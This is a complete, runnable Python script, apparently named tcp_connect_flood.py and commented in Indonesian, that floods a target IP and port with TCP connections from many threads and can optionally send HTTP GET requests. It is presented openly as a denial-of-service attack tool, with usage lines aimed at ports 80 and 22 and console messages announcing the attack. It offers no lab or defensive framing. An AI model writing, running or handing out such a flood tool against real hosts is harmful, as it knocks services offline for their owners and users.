# http
# python3 ddos2_port80_22.py 192.168.1.YY 80 -t 200 -d 120 --http
# port 22
# python3 ddos2_port80_22.py 192.168.1.ZZ 22 -t 100 -d 60

# tcp_connect_flood.py
import socket
import threading
import time
import argparse

# Fungsi untuk membuat koneksi TCP dan mengirim data (opsional)
def tcp_connector(target_ip, target_port, duration_seconds, thread_id, attack_counter, send_http_get):
    print(f"Thread-{thread_id}: Memulai TCP flood ke {target_ip}:{target_port}")
    
    http_request = None
    if send_http_get:
        # Request GET HTTP sederhana
        http_request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n\r\n".encode()

    start_time = time.time()
    connections_made = 0
    while time.time() - start_time < duration_seconds:
        client_socket = None # Reset socket di setiap iterasi
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(2) # Timeout koneksi 2 detik
            client_socket.connect((target_ip, target_port))
            connections_made += 1
            attack_counter[0] += 1 # Menghitung koneksi berhasil

            if http_request:
                client_socket.sendall(http_request)
                # Anda bisa mencoba membaca respons, tapi untuk DoS biasanya tidak perlu
                # client_socket.recv(1024) 
            
            # Untuk DoS murni, kita bisa langsung tutup atau biarkan server timeout
            # Menutup socket dengan cepat juga bisa membebani jika banyak koneksi dibuka-tutup
            # client_socket.shutdown(socket.SHUT_RDWR) # Kirim FIN
        except socket.timeout:
            # print(f"Thread-{thread_id}: Connection timed out")
            pass
        except socket.error as e:
            # print(f"Thread-{thread_id}: Socket error - {e}")
            pass
        except Exception as e:
            # print(f"Thread-{thread_id}: Error - {e}")
            pass
        finally:
            if client_socket:
                client_socket.close()
        
        # Jeda kecil antar upaya koneksi dalam satu thread (opsional)
        # time.sleep(0.01) 

    print(f"Thread-{thread_id}: Selesai. Koneksi berhasil dibuat: {connections_made}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="TCP Connection/HTTP GET Flood Script Sederhana")
    parser.add_argument("target_ip", help="Alamat IP target")
    parser.add_argument("target_port", type=int, help="Port target (misal: 22 untuk SSH, 80 untuk HTTP)")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Jumlah threads (default: 100)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Durasi serangan dalam detik (default: 60)")
    parser.add_argument("--http", action="store_true", help="Kirim request HTTP GET (cocok untuk port 80)")

    args = parser.parse_args()

    target_ip = args.target_ip
    target_port = args.target_port
    num_threads = args.threads
    duration_seconds = args.duration
    send_http_get = args.http

    if send_http_get and target_port != 80:
        print(f"Peringatan: Opsi --http digunakan, tetapi port target adalah {target_port} (bukan 80). Tetap melanjutkan...")
    
    if not send_http_get and target_port == 80:
        print("Info: Menyerang port 80 tanpa opsi --http. Hanya akan melakukan connection flood.")


    print(f"Menargetkan {target_ip}:{target_port} dengan {num_threads} threads selama {duration_seconds} detik.")
    if send_http_get:
        print("Mode HTTP GET Flood aktif.")
    else:
        print("Mode TCP Connection Flood aktif.")
    print("Tekan Ctrl+C untuk menghentikan serangan lebih awal.")

    all_threads = []
    attack_counter = [0] # List agar bisa di-pass by reference

    try:
        for i in range(num_threads):
            thread = threading.Thread(target=tcp_connector, args=(target_ip, target_port, duration_seconds, i + 1, attack_counter, send_http_get))
            thread.daemon = True
            all_threads.append(thread)
            thread.start()
        
        start_attack_time = time.time()
        while time.time() - start_attack_time < duration_seconds:
            print(f"\rTotal koneksi berhasil dibuat (dari semua thread): {attack_counter[0]}", end="")
            time.sleep(0.1)
            if not any(t.is_alive() for t in all_threads):
                break

        print(f"\nSerangan TCP Flood selesai. Total koneksi berhasil: {attack_counter[0]}")

    except KeyboardInterrupt:
        print("\nSerangan dihentikan oleh pengguna.")
    except Exception as e:
        print(f"Terjadi kesalahan: {e}")
    finally:
        print("Keluar dari program.")